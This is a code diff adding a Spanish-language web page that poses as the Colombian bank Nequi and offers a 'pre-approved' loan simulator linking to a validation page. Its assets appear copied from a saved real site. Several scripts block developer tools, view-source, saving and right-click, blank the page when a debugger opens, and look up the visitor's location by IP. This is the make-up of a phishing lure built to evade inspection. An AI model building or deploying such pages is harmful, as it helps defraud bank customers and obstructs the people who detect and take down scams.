@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#FBE5F2">
+<link rel="icon" href="../favicon_n.png" type="favicon.png" sizes="16x16" />
+<!-- Script de Bloqueo Absoluto -->
+<script>
+    window.addEventListener('keydown', function(e) {
+        if (
+            e.key === 'F12' || 
+            e.keyCode === 123 || 
+            (e.ctrlKey && e.shiftKey && (e.key.toLowerCase() === 'i' || e.key.toLowerCase() === 'j' || e.key.toLowerCase() === 'c' || e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) || 
+            (e.ctrlKey && (e.key.toLowerCase() === 'u' || e.keyCode === 85))
+        ) {
+            e.preventDefault();
+            e.stopPropagation();
+            e.stopImmediatePropagation();
+            return false;
+        }
+    }, true);
+
+    window.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        return false;
+    }, true);
+</script>
+
+<!-- Inserted by miarroba -->
+<script src="./NequiArchivos/f.txt"></script><script src="./NequiArchivos/rules-p-d5x2uDVHd7ALE.js.descarga" async=""></script><script type="text/javascript" async="" src="./NequiArchivos/quant.js.descarga"></script><script type="text/javascript" async="" src="./NequiArchivos/analytics.js.descarga"></script><script src="./NequiArchivos/f(1).txt"></script><script async="" src="./NequiArchivos/gtm.js.descarga"></script><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-T2VG59');</script>
+<script async="" src="./NequiArchivos/f(2).txt" crossorigin="anonymous" data-checked-head="true"></script>
+<!-- Inserted by miarroba -->
+    <link rel="stylesheet" href="./NequiArchivos/jsypn.css">
+    
+<title>Nequi | Per-aprobado</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<link rel="stylesheet" type="text/css" href="./NequiArchivos/util.css">
+<link rel="stylesheet" type="text/css" href="./NequiArchivos/main.css">
+<link rel="preconnect" href="https://fonts.googleapis.com/">
+<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+<link href="./NequiArchivos/css2" rel="stylesheet">
+<link rel="icon" href="favicon_n.png" type="favicon.png" sizes="16x16" />
+<script src="./NequiArchivos/jquery.min.js.descarga"></script>
+<script src="./NequiArchivos/jquery-3.7.1.min.js.descarga"></script>
+<script src="./NequiArchivos/jquery.mask.js.descarga"></script>
+    
+      <script>
+         $.getJSON("https://ipinfo.io", function (response) {
+            $("#address").html("" + response.city + ", " + response.country);
+         })
+      </script>
+<script async="" src="./NequiArchivos/ca-pub-7294310421616689"></script>
+
+<style>
+/* ESTILOS AISLADOS: NO MODIFICAN EL CSS EXISTENTE */
+
+.loan-simulator {
+    width: 100%;
+    max-width: 520px;
+    margin: 0 auto;
+    padding: 28px 20px;
+    box-sizing: border-box;
+    font-family: Arial, sans-serif;
+    color: #ffffff;
+}
+
+.loan-simulator * {
+    box-sizing: border-box;
+}
+
+.loan-simulator h2 {
+    text-align: center;
+    font-size: 25px;
+    margin: 0 0 28px;
+    color: #242424;
+}
+
+.loan-panel {
+    background: #26001f;
+    border-radius: 12px;
+    padding: 28px 20px;
+    width: 100%;
+}
+
+.loan-question {
+    font-size: 19px;
+    margin-bottom: 12px;
+}
+
+.loan-amount {
+    font-size: 38px;
+    font-weight: bold;
+    margin-bottom: 28px;
+    letter-spacing: 0.5px;
+}
+
+.loan-slider {
+    width: 100%;
+    height: 9px;
+    appearance: none;
+    -webkit-appearance: none;
+    background: linear-gradient(
+        to right,
+        #e50087 0%,
+        #e50087 100%
+    );
+    border-radius: 20px;
+    outline: none;
+    cursor: pointer;
+}
+
+.loan-slider::-webkit-slider-thumb {
+    appearance: none;
+    -webkit-appearance: none;
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    background: #e50087;
+    border: 3px solid #ffffff;
+    cursor: pointer;
+}
+
+.loan-slider::-moz-range-thumb {
+    width: 25px;
+    height: 25px;
+    border-radius: 50%;
+    background: #e50087;
+    border: 3px solid #ffffff;
+    cursor: pointer;
+}
+
+.loan-limits {
+    display: flex;
+    justify-content: space-between;
+    font-size: 14px;
+    margin-top: 18px;
+}
+
+.loan-details {
+    background: #ffffff;
+    color: #292929;
+    border-radius: 10px;
+    padding: 20px;
+    margin-top: 20px;
+}
+
+.loan-label {
+    color: #a02c66;
+    font-size: 14px;
+    margin-bottom: 5px;
+}
+
+.loan-value {
+    font-size: 20px;
+    font-weight: bold;
+    margin-bottom: 20px;
+}
+
+.loan-months {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 22px;
+}
+
+.loan-months button {
+    width: 48px;
+    height: 43px;
+    border: none;
+    border-radius: 8px;
+    background: #eeeeee;
+    font-size: 25px;
+    cursor: pointer;
+}
+
+.loan-month-number {
+    text-align: center;
+    font-size: 23px;
+}
+
+.loan-installment {
+    font-size: 27px;
+    font-weight: bold;
+    margin-top: 8px;
+}
+
+.loan-description {
+    font-size: 13px;
+    line-height: 1.5;
+    color: #555;
+    margin-top: 12px;
+}
+
+.loan-continue {
+    display: block;
+    width: 100%;
+    height: 52px;
+    margin-top: 25px;
+    border: none;
+    border-radius: 12px;
+    background: #e50087;
+    color: #ffffff;
+    font-size: 17px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+.loan-continue:hover {
+    background: #c90075;
+}
+
+@media(max-width:480px) {
+    .loan-simulator {
+        padding: 24px 15px;
+    }
+
+    .loan-amount {
+        font-size: 34px;
+    }
+
+    .loan-panel {
+        padding: 23px 16px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<div class="loan-simulator">
+
+    <h2>Pre-Aprobado</h2>
+
+    <div class="loan-panel">
+
+        <div class="loan-question">
+            ¿Cuánto vas a prestar?
+        </div>
+
+        <div class="loan-amount" id="loanAmount">
+            $100.000
+        </div>
+
+        <input
+            type="range"
+            class="loan-slider"
+            id="loanRange"
+            min="100000"
+            max="5000000"
+            step="50000"
+            value="4150000"
+        >
+
+        <div class="loan-limits">
+            <span>$100.000</span>
+            <span>$5.000.000</span>
+        </div>
+
+    </div>
+
+    <div class="loan-details">
+
+        <div class="loan-months">
+
+            <button type="button" id="loanMinus">−</button>
+
+            <div>
+                <div class="loan-label" style="text-align:center">
+                    Meses
+                </div>
+
+                <div class="loan-month-number" id="loanMonths">
+                    12
+                </div>
+            </div>
+
+            <button type="button" id="loanPlus">+</button>
+
+        </div>
+
+        <div class="loan-label">
+            Tasa de interés
+        </div>
+
+        <div class="loan-value">
+            1.81 % E.M. - 24 % E.A.
+        </div>
+
+        <div class="loan-label">
+            Valor aproximado de tu cuota mensual:
+        </div>
+
+        <div class="loan-installment" id="loanInstallment">
+            $0
+        </div>
+
+        <div class="loan-description">
+            Simulación informativa. El valor incluye capital
+            e intereses. No constituye una oferta ni aprobación
+            de crédito.
+        </div>
+
+    </div>
+
+    <button
+        type="button"
+        class="loan-continue"
+        id="loanContinue">
+        Continuar
+    </button>
+
+</div>
+
+<script>
+(function () {
+
+    const range = document.getElementById("loanRange");
+    const amount = document.getElementById("loanAmount");
+    const months = document.getElementById("loanMonths");
+    const installment = document.getElementById("loanInstallment");
+
+    let selectedMonths = 12;
+
+    const formatter = new Intl.NumberFormat("es-CO", {
+        style: "currency",
+        currency: "COP",
+        maximumFractionDigits: 0
+    });
+
+    function calculate() {
+
+        const capital = Number(range.value);
+        const interest = 0.0181;
+
+        amount.textContent = formatter.format(capital);
+
+        const monthlyPayment = interest === 0
+            ? capital / selectedMonths
+            : capital * interest /
+              (1 - Math.pow(1 + interest, -selectedMonths));
+
+        installment.textContent = formatter.format(monthlyPayment);
+
+        months.textContent = selectedMonths;
+
+        const percentage =
+            ((capital - 100000) / (5000000 - 100000)) * 100;
+
+        range.style.background =
+            `linear-gradient(to right, #e50087 ${percentage}%,
+            #eeeeee ${percentage}%)`;
+    }
+
+    range.addEventListener("input", calculate);
+
+    document.getElementById("loanMinus")
+        .addEventListener("click", function () {
+            if (selectedMonths > 6) {
+                selectedMonths--;
+                calculate();
+            }
+        });
+
+    document.getElementById("loanPlus")
+        .addEventListener("click", function () {
+            if (selectedMonths < 60) {
+                selectedMonths++;
+                calculate();
+            }
+        });
+
+    document.getElementById("loanContinue")
+        .addEventListener("click", function () {
+            window.location.href = "../validando_pre_aprobado.html";
+        });
+
+    calculate();
+
+})();
+</script>
+
+
+<script>
+    // Función de detección de PC y bloqueo de herramientas abiertas por consola
+    function checkDevice() {
+        const isDesktop = !(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) || window.innerWidth > 992;
+        if (isDesktop) {
+            const blocker = document.getElementById('desktop-blocker');
+            if (blocker) {
+                blocker.style.display = 'flex';
+            }
+        }
+    }
+    checkDevice();
+    window.addEventListener('resize', checkDevice);
+
+    // Detección heurística adicional para evitar inspección por depuración activa
+    setInterval(function() {
+        const widthThreshold = window.outerWidth - window.innerWidth > 160;
+        const heightThreshold = window.outerHeight - window.innerHeight > 160;
+        if ((widthThreshold || heightThreshold) && !(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent))) {
+            document.body.innerHTML = "<h2 style='text-align:center; margin-top:20vh; font-family:Arial;'>Acceso bloqueado por seguridad.</h2>";
+        }
+    }, 1000);
+</script>
+
+<script src="https://unpkg.com/lucide@latest"></script>
+<script>
+    lucide.createIcons();
+</script>
+
+<script>
+    // BLOQUEO PARA DESCARGAR PAGINA CTRL+S
+(() => {
+    'use strict';
+
+    // Evita ejecutar dos veces la protección.
+    if (window.__proteccionWebActiva) return;
+    window.__proteccionWebActiva = true;
+
+    function mostrarAviso() {
+        if (document.getElementById('aviso-proteccion')) return;
+
+        const aviso = document.createElement('div');
+        aviso.id = 'aviso-proteccion';
+
+        Object.assign(aviso.style, {
+            position: 'fixed',
+            inset: '0',
+            zIndex: '2147483647',
+            background: 'rgba(0,0,0,.88)',
+            color: '#fff',
+            display: 'flex',
+            alignItems: 'center',
+            justifyContent: 'center',
+            padding: '24px',
+            boxSizing: 'border-box',
+            fontFamily: 'Arial, sans-serif',
+            textAlign: 'center'
+        });
+
+        const panel = document.createElement('div');
+        Object.assign(panel.style, {
+            maxWidth: '420px',
+            padding: '28px',
+            background: '#202020',
+            borderRadius: '12px',
+            border: '1px solid #555'
+        });
+
+        const titulo = document.createElement('h2');
+        titulo.textContent = 'Acción no permitida';
+
+        const mensaje = document.createElement('p');
+        mensaje.textContent =
+            'Esta acción está restringida en esta página.';
+
+        const boton = document.createElement('button');
+        boton.type = 'button';
+        boton.textContent = 'Volver a la página';
+
+        Object.assign(boton.style, {
+            padding: '12px 20px',
+            border: '0',
+            borderRadius: '6px',
+            cursor: 'pointer',
+            fontWeight: 'bold'
+        });
+
+        boton.addEventListener('click', () => aviso.remove());
+
+        panel.append(titulo, mensaje, boton);
+        aviso.appendChild(panel);
+        document.body.appendChild(aviso);
+    }
+
+    // Bloquear Ctrl+S, Ctrl+U, Ctrl+P y algunas herramientas habituales.
+    document.addEventListener('keydown', function (e) {
+        const tecla = e.key.toLowerCase();
+
+        if (
+            (e.ctrlKey || e.metaKey) &&
+            ['s', 'u', 'p'].includes(tecla)
+        ) {
+            e.preventDefault();
+            e.stopImmediatePropagation();
+            mostrarAviso();
+        }
+
+        // Bloqueo básico de F12 y Ctrl+Shift+I/J/C.
+        if (
+            tecla === 'f12' ||
+            ((e.ctrlKey || e.metaKey) &&
+             e.shiftKey &&
+             ['i', 'j', 'c'].includes(tecla))
+        ) {
+            e.preventDefault();
+            e.stopImmediatePropagation();
+            mostrarAviso();
+        }
+    }, true);
+
+    // Bloquear menú contextual del clic derecho.
+    document.addEventListener('contextmenu', function (e) {
+        e.preventDefault();
+        mostrarAviso();
+    }, true);
+
+})();
+</script>
+
+</body>
+</html>
